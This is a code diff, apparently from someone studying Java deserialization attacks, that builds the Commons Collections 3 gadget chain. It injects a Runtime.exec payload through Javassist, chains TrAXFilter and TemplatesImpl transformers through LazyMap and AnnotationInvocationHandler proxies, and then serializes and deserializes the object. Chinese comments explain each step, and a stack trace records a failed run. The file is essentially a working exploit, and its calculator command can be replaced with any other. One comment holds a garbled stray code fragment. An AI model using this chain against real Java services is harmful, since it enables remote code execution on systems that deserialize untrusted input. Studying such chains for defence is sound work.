@@ -16,6 +16,7 @@ import org.apache.xalan.xsltc.trax.TrAXFilter;
 import javax.xml.transform.Templates;
 import java.io.*;
 import java.lang.reflect.*;
+import java.text.Annotation;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -80,7 +81,7 @@ public class CommonCollectioms3 {
 
         final CtClass clazz = pool.get(CommonCollections2.StubTransletPayload.class.getName());
 
-        String cmd = "java.lang.Runtime.getRuntime().exec(\"kcalc\");";
+        String cmd = "java.lang.Runtime.getRuntime().exec(\"galculator\");";
         clazz.makeClassInitializer().insertAfter(cmd);
         clazz.setName("ysoserial.Pwner" + System.nanoTime());
         CtClass superC = pool.get(abstTranslet.getName());
@@ -136,7 +137,7 @@ public class CommonCollectioms3 {
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(new Class[] {Templates.class}, new Object[] {template})
         });
-        //cts.transform(1);
+//        cts.transform(1);
         //然后可以利用lazyMap
         // 发现报错了
         //Exception in thread "main" java.lang.UnsupportedOperationException: Serialization support for org.apache.commons.collections.functors.InstantiateTransformer is disabled for security reasons. To enable it set system property 'org.apache.commons.collections.enableUnsafeSerialization' to 'true', but you must ensure that your application does not de-serialize objects from untrusted sources.
@@ -149,7 +150,7 @@ public class CommonCollectioms3 {
         //  看记录发现pom.xml 引入了3.2.2 而不是3.1版本
         HashMap map = new HashMap();
         LazyMap lazyMap = (LazyMap) LazyMap.decorate(map, cts);
-        lazyMap.put("1", "2");
+//        lazyMap.put("1", "2");
         // 通过lasyMap.get() 发现可以触发，但是直接反序列化是不可以 的
 //        lazyMap.get(1);
 
@@ -176,15 +177,62 @@ public class CommonCollectioms3 {
         Object obj = ctr.newInstance(Override.class, lazyMap);
         // 仍然如同CommonCollection1, 设置一个动态代理类,
         // 至此 CommonCollection3 调试完毕
+
+        /*
+        * 再详细解释一下， 现在的目标是想调用AnnotationInvocatiomHandler中的invoke函数，
+        * invoke函数会调用memberValues.get()函数
+        * memberValue的值是一个LazyMap函数， 其get方法会调用 `this.factory.transform(key);` 即通过`decorate`中的`Transformer`
+        * 而`Transformer。tranceform` 会调用 `TrAXFilter` 和 `Template`，达到反序列化的目的。
+        *ers for an annotation method");
+        } else {
+        * */
         Map proxy_ctr_obj = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, (InvocationHandler) obj);
-//        InvocationHandler ctr_obj2 = (InvocationHandler)ctr.newInstance(Override.class, proxy_ctr_obj);
+        InvocationHandler ctr_obj2 = (InvocationHandler)ctr.newInstance(Override.class, proxy_ctr_obj);
+//        proxy_ctr_obj.toString();
+        Map proxy_ctr_obj2 = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, (InvocationHandler) ctr_obj2);
+//        proxy_ctr_obj2.toString();
+//        proxy_ctr_obj2.entrySet();
 //        ctr_obj2.invoke(proxy_ctr_obj, "get", "1");
-        proxy_ctr_obj.hashCode();
+//        proxy_ctr_obj.get("1");
 //        proxy_ctr_obj.getOrDefault("1", "2");
         // 这里在调用debug的时候，触发了，但是直接run没有触发， 奇怪了。
         // 原因是：
-//        byte[] b = do_serialize(ctr_obj2);
-//        Object a = do_unserialize(b);
+        byte[] b = do_serialize(proxy_ctr_obj2);
+        Object a = do_unserialize(b);
+        
+        /*
+        Exception in thread "main" org.apache.commons.collections.FunctorException: InstantiateTransformer: Constructor threw an exception
+        at org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:114)
+        at org.apache.commons.collections.functors.ChainedTransformer.transform(ChainedTransformer.java:122)
+        at org.apache.commons.collections.map.LazyMap.get(LazyMap.java:151)
+        at sun.reflect.annotation.AnnotationInvocationHandler.invoke(AnnotationInvocationHandler.java:77)
+        at com.sun.proxy.$Proxy0.entrySet(Unknown Source)
+        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:443)
+        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
+        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+        at java.lang.reflect.Method.invoke(Method.java:606)
+        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
+        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1893)
+        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1798)
+        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1350)
+        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:370)
+        at com.example.apache_collections.CommonCollectioms3.do_unserialize(CommonCollectioms3.java:217)
+        at com.example.apache_collections.CommonCollectioms3.main(CommonCollectioms3.java:198)
+    Caused by: java.lang.reflect.InvocationTargetException
+        at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+        at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
+        at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+        at java.lang.reflect.Constructor.newInstance(Constructor.java:526)
+        at org.apache.commons.collections.functors.InstantiateTransformer.transform(InstantiateTransformer.java:105)
+        ... 16 more
+    Caused by: java.lang.NullPointerException
+        at org.apache.xalan.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:366)
+        at org.apache.xalan.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:341)
+        at org.apache.xalan.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:369)
+        at org.apache.xalan.xsltc.trax.TrAXFilter.<init>(TrAXFilter.java:61)
+        ... 21 more
+             */
 
         return;
     }
